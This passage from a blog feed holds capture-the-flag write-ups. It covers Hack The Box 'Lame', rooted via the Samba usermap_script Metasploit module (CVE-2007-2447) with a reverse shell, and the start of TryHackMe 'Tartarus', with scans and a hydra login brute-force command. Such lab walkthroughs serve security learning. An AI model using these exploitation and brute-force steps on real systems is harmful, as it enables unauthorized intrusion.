| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 48762/tcp): CLEAN (Timeout)
|   Check 3 (port 18141/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-10-26T14:47:20-04:00
| smb-security-mode: 
|   account_used: &amp;lt;blank&amp;gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn'&lt;/span&gt;t establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMB2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

NSE: Script Post-scanning.
NSE: Starting runlevel 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;of 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;of 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;of 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;52.47 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;enumerating-ftp&quot;&gt;Enumerating FTP&lt;/h1&gt;

&lt;p&gt;Can connetct via anonymous login. But there are no usefull information on the FTP-Server.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/HTB/Boxes/Lame]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
Connected to 10.10.10.3.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 2.3.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.3:fr3akazo1d&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;enumerating-smb&quot;&gt;Enumerating SMB&lt;/h1&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/HTB/Boxes]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.3                                                                                                                                                                                                                  1 ⨯
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
  print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  opt                                                 NO ACCESS 
  IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                               NO ACCESS IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
  ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             NO ACCESS IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/HTB/Boxes]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
  print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  .&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
  dw--w--w--                0 Sun May 20 20:36:11 2012  ..
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  orbit-makis
  dr--r--r--                0 Sun Oct 25 23:44:13 2020  .ICE-unix
  fw--w--w--                0 Sun Oct 25 23:45:17 2020  5139.jsvc_up
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  .X11-unix
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  gconfd-makis
  fw--w--w--               11 Sun Oct 25 23:44:39 2020  .X0-lock
  .&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;X11-unix&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  ..
  fr--r--r--                0 Sun Oct 25 23:44:39 2020  X0
  opt                                                 NO ACCESS 
  IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                               NO ACCESS IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
  ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             NO ACCESS IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lame server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 3.0.20-Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Used smbmap for enumerating SMB-Shares. The “tmp” directory is read and writeable.&lt;/p&gt;

&lt;h2 id=&quot;checking-smb-vulnerability&quot;&gt;checking SMB-Vulnerability&lt;/h2&gt;

&lt;p&gt;I have checked if the SMB-Version is vulnerabaly. Used namp with the command: –script smb-vuln*&lt;/p&gt;

&lt;h1 id=&quot;enumerating-port-3632&quot;&gt;Enumerating Port 3632&lt;/h1&gt;

&lt;p&gt;I tried to exploit Port 3632 with an Metasploit scirpt: distcc_exec&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/misc/distcc_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.10.10.3:3632 - Exploit failed: An exploitation error occurred.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit completed, but no session was created.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But it failed and i was not able to get access to the target. After some tries, i gave up at this port.&lt;/p&gt;

&lt;p&gt;Maybe Samba is the way in.&lt;/p&gt;

&lt;h1 id=&quot;enumerating-samba-smbd-3020-debian&quot;&gt;Enumerating Samba smbd 3.0.20-Debian&lt;/h1&gt;

&lt;p&gt;I pay attention to this version of Samba and tried to look if there is any vulnerabily for this.&lt;/p&gt;

&lt;p&gt;After some research i came accross follwing articel on ragid7: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script&lt;/p&gt;

&lt;p&gt;There is a vulnerability in this version. You can bybass ther authentication without any username and password.&lt;/p&gt;

&lt;p&gt;CVE-Details: CVE-2007-2447&lt;/p&gt;

&lt;p&gt;And there is a Metasploit-Module to exploit this vulnerability&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/samba/usermap_script
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Info Page of this module:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/samba/usermap_script&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; info

       Name: Samba &lt;span class=&quot;s2&quot;&gt;&quot;username map script&quot;&lt;/span&gt; Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BSD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck &amp;lt;jduck@metasploit.com&amp;gt;

Available targets:
  Id  Name
  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;    &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
  RHOSTS                   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
  RPORT   139              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Payload information:
  Space: 1024

Description:
  This module exploits a &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;execution vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  &lt;span class=&quot;s2&quot;&gt;&quot;username map script&quot;&lt;/span&gt; configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;34700&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;534
  http://samba.org/samba/security/CVE-2007-2447.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;For this exploit we only have to set the rhosts and run the exploit.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/samba/usermap_script&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.34:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.34:4444 -&amp;gt; 10.10.10.3:34509&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-10-30 00:25:19 +0100

&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This exploit gave as root access to the Machine.&lt;/p&gt;

&lt;p&gt;Now we have root access we can check for the User.txt and the Root.txt file and submit it to HackTheBox.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;I have to say, i was clueless about the enumeration of the weakness of this box. I had a hint, on an writeup of this box, that Samba is the way in. So i have payed more attention to this section.&lt;/p&gt;

&lt;p&gt;This was my first Box with this kind of vulenrability. I have learnd some new skills about samba and how i can exploit this kind of version.&lt;/p&gt;

&lt;p&gt;Th4nks 4 R3ad1ng&lt;/p&gt;

&lt;p&gt;Fr3akazo1d&lt;/p&gt;
</description>
        <pubDate>Thu, 29 Oct 2020 23:14:00 +0000</pubDate>
        <link>/blog/lame/</link>
        <guid isPermaLink="true">/blog/lame/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Tartarus</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Tartarus&lt;/td&gt;
      &lt;td&gt;25.10.2020&lt;/td&gt;
      &lt;td&gt;Easy&lt;/td&gt;
      &lt;td&gt;Security, ctf, dirbuster, tartarus&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rustscan&lt;/td&gt;
      &lt;td&gt;rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial  tee output&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;gobuster&lt;/td&gt;
      &lt;td&gt;gobuster dir -u http://10.10.213.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;dirsearch&lt;/td&gt;
      &lt;td&gt;python /git/dirsearch/dirsearch.py -u 10.10.213.137 -e php,html&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;ftp 10.10.213.137&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Burp-Suite&lt;/td&gt;
      &lt;td&gt;GUI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;hydra&lt;/td&gt;
      &lt;td&gt;hydra -l e##x -P c#########s.txt 10.10.213.137 http-post-form “/s##########t/a##########e.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login:Incorrect password! “&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;pwncat&lt;/td&gt;
      &lt;td&gt;ppwncat –config /git/pwncat/data/pwncatrc -p 9910 -l&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;rustscan-output&quot;&gt;Rustscan-Output&lt;/h2&gt;

&lt;p&gt;The first step is always to run a network scan on the Target. For the last weeks i am using Rustscan. This is a very fast Network-Scanner. He Scans all the ports and then made a nmap scan on the open ports.&lt;/p&gt;

&lt;p&gt;Below the Output of the rustscan.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     _____           _    _____
    |  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;        | |  / ____|
    | |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |   _ ___| |_| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___ __ _ _ __
    |  _  / | | / __| __|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;'_ \
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust.

Automatically upping ulimit to 5000
Open 22
Open 21
Open 80
Starting nmap.
The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 22,21,80 10.10.213.137
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-25 22:12 CET
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:12
Completed Parallel DNS resolution of 1 host. at 22:12, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:12
Scanning 10.10.213.137 [3 ports]
Discovered open port 22/tcp on 10.10.213.137
Discovered open port 21/tcp on 10.10.213.137
Discovered open port 80/tcp on 10.10.213.137
Completed Connect Scan at 22:12, 0.06s elapsed (3 total ports)
Initiating Service scan at 22:12
Scanning 3 services on 10.10.213.137
Completed Service scan at 22:12, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.213.137.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
NSE: [ftp-bounce 10.10.213.137:21] PORT response: 500 Illegal PORT command.
Completed NSE at 22:12, 2.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.52s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Nmap scan report for 10.10.213.137
Host is up, received user-set (0.062s latency).
Scanned at 2020-10-25 22:12:42 CET for 9s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.170.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZdORUZHg9RjrmmXa0kKVVlArZPd+zITEEkyYL1gzvyCHE9mu9jWkpuuwZRk8lrar+exGSTNcz/9wijYrGftUA/tJZ/4WRsHTbl6taJr7UYRoCgpNy0wXC3+oC5wfIdh3Lgah4MozwRPGJ5DQE+zIIf0sVlK2T2jxFXDjuxULdWM8TPjfsBjBcu55RZ6/iBC69LRp8AtKTVCe502yaUCRKM8GbxU7zVmsSAZxUOSDyB4u8uJ+IhS7oTy9PCHLmsHg899BozsFe+LArsxloL032VDsh9ZfUFiXhj3FSze49Wk32xX4s/atQJwpCxabtCCKjTMREwEbg/7z5UU+euBsL
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJMh3A9yhxjDCJIcY6+SceWHxorSphXU0Jpvk8tfBkX4MsebBRvPq3SnRw5PfPLz7Nkk7xWDIcbPHsmTvMcmOLs=
|   256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7R6jyxhQlyAs1SlBzJnXw4dHC28Tz+uMKKiNJ6AjUp
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;enumeration-ftp&quot;&gt;Enumeration FTP&lt;/h2&gt;

&lt;p&gt;Rustscan shows me that anonymous login is available on the Target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.170.39
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checked FTP-Server, found 2 files&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
Connected to 10.10.213.137.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.213.137:fr3akazo1d&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; get test.txt
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: test.txt remote: test.txt
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;17 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
17 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;29.2797 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
